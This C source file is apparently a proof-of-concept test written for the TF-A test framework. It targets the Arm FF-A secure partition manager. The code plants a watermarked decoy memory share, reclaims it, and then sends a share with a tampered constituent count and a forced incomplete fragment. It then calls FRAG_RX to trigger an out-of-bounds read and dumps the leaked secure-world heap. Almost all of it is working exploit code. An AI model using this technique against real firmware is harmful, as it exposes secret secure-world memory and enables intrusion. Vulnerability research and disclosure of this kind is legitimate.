#include <stdlib.h>
#include <string.h>
#include <tftf.h>
#include <ffa.h>
#include <ffa_helpers.h>
#include <spm_test_helpers.h>

#define MAILBOX_SIZE        PAGE_SIZE
#define SENDER              0x8000
#define RECEIVER            0x8001
#define NS_DRAM_VALID       0x88000000ULL
#define LEAK_WORDS          512 
#define PATTERN             0x42424242ULL

static uint64_t local_buf[LEAK_WORDS];

test_result_t test_ffa_heap_leak(void)
{
    struct ffa_value ver = ffa_version(FFA_VERSION_COMPILED);
    if (ver.fid == FFA_ERROR) return TEST_RESULT_FAIL;
    INFO("[heap_leak] FF-A version: 0x%lx\n", (unsigned long)ver.fid);

    struct mailbox_buffers mb;
    GET_TFTF_MAILBOX(mb);

    /* Step 1: Allocate Decoy Object C with 200 valid constituents (watermark 0x42424242) */
    INFO("[heap_leak] Step 1: Allocating Decoy Object C...\n");

    struct ffa_memory_region_constituent constituents_c[200];
    for (int i = 0; i < 200; i++) {
        constituents_c[i].address = (void *)(0x88010000ULL + i * 0x1000);
        constituents_c[i].page_count = 1;
        constituents_c[i].reserved = 0x42424242;
    }

    struct ffa_memory_access receiver_c = ffa_memory_access_init(
        RECEIVER, FFA_DATA_ACCESS_RW, FFA_INSTRUCTION_ACCESS_NX, 0, NULL);

    uint32_t total_len_c, frag_len_c;
    ffa_memory_region_init(
        mb.send, MAILBOX_SIZE, SENDER, &receiver_c, 1,
        constituents_c, 200, 0, 0,
        FFA_MEMORY_NORMAL_MEM, FFA_MEMORY_CACHE_WRITE_BACK,
        FFA_MEMORY_INNER_SHAREABLE, &total_len_c, &frag_len_c);

    struct ffa_value ret = ffa_mem_share(total_len_c, frag_len_c);
    if (ret.fid == FFA_ERROR) {
        ERROR("[heap_leak] Decoy Object C rejected: %ld\n", (long)ret.arg2);
        return TEST_RESULT_FAIL;
    }
    ffa_memory_handle_t handle_c = ffa_mem_success_handle(ret);
    INFO("[heap_leak] Handle C: 0x%llx\n", (unsigned long long)handle_c);

    /* Step 2: Reclaim Decoy Object C (Freeing memory, leaving watermark) */
    INFO("[heap_leak] Step 2: Reclaiming Decoy Object C...\n");
    smc_args reclaim_args = {
        .fid  = FFA_MEM_RECLAIM,
        .arg1 = handle_c & 0xFFFFFFFF,
        .arg2 = handle_c >> 32,
        .arg3 = 0,
    };
    tftf_smc(&reclaim_args);

    /* Step 3: Create Malicious Object A (incomplete) over Object C remnants */
    INFO("[heap_leak] Step 3: Allocating Malicious Object A...\n");
    struct ffa_memory_region_constituent constituents_a[1] = {
        { .address = (void *)NS_DRAM_VALID, .page_count = 1, .reserved = 0 },
    };
    struct ffa_memory_access receiver_a = ffa_memory_access_init(
        RECEIVER, FFA_DATA_ACCESS_RW, FFA_INSTRUCTION_ACCESS_NX, 0, NULL);

    uint32_t total_len_a, frag_len_a;
    ffa_memory_region_init(
        mb.send, MAILBOX_SIZE, SENDER, &receiver_a, 1,
        constituents_a, 1, 0, 0,
        FFA_MEMORY_NORMAL_MEM, FFA_MEMORY_CACHE_WRITE_BACK,
        FFA_MEMORY_INNER_SHAREABLE, &total_len_a, &frag_len_a);

    /* Inject malicious constituent_count */
    struct ffa_memory_region *r_a = (struct ffa_memory_region *)mb.send;
    struct ffa_memory_access *rcv_a = &r_a->receivers[0];
    struct ffa_composite_memory_region *comp_a = (struct ffa_composite_memory_region *)
        ((uint8_t *)r_a + rcv_a->composite_memory_region_offset);
    comp_a->constituent_count = 200; 

    frag_len_a = 96; // Force incomplete

    ret = ffa_mem_share(total_len_a, frag_len_a);
    if (ret.fid != FFA_MEM_FRAG_RX) {
        ERROR("[heap_leak] Object A rejected: fid=0x%lx\n", (unsigned long)ret.fid);
        return TEST_RESULT_FAIL;
    }
    ffa_memory_handle_t handle_a = ffa_frag_handle(ret);
    INFO("[heap_leak] Handle A: 0x%llx\n", (unsigned long long)handle_a);

    /* Step 4: FRAG_RX to force OOB read over the 0x42424242 watermark */
    INFO("[heap_leak] Step 4: FRAG_RX to force pattern read...\n");
    smc_args args = {
        .fid  = FFA_MEM_FRAG_RX,
        .arg1 = handle_a & 0xFFFFFFFF,
        .arg2 = handle_a >> 32,
        .arg3 = 0,
        .arg4 = 0,
    };
    smc_ret_values smc_ret = tftf_smc(&args);

    if (smc_ret.ret0 == FFA_ERROR) {
        ERROR("[heap_leak] FRAG_RX failed (SPMC blocked OOB): %ld\n", (long)smc_ret.ret2);
        return TEST_RESULT_FAIL;
    }

    uint32_t copy_size = (uint32_t)smc_ret.ret3;
    INFO("[heap_leak] FRAG_RX OK! SPMC copied %u bytes to NWd!\n", copy_size);

    if (copy_size > MAILBOX_SIZE) copy_size = MAILBOX_SIZE;
    uint32_t words = copy_size / 8;
    if (words > LEAK_WORDS) words = LEAK_WORDS;

    for (uint32_t w = 0; w < words; w++) {
        memcpy(&local_buf[w], (uint8_t *)mb.recv + (w * 8), 8);
    }
    ffa_rx_release();

    INFO("[heap_leak] === LEAKED MEMORY DUMP ===\n");
    for (uint32_t w = 0; w < words; w++) {
        INFO("[heap_leak] +%03u: 0x%016llx", w * 8, (unsigned long long)local_buf[w]);
        if ((local_buf[w] & 0xFFFFFFFF00000000ULL) == (PATTERN << 32) || 
            (local_buf[w] & 0x00000000FFFFFFFFULL) == PATTERN) {
            INFO(" <-- PATTERN 0x42424242 FOUND! (Secure World Heap Leaked)");
        }
        INFO("\n");
    }

    return TEST_RESULT_FAIL;
}
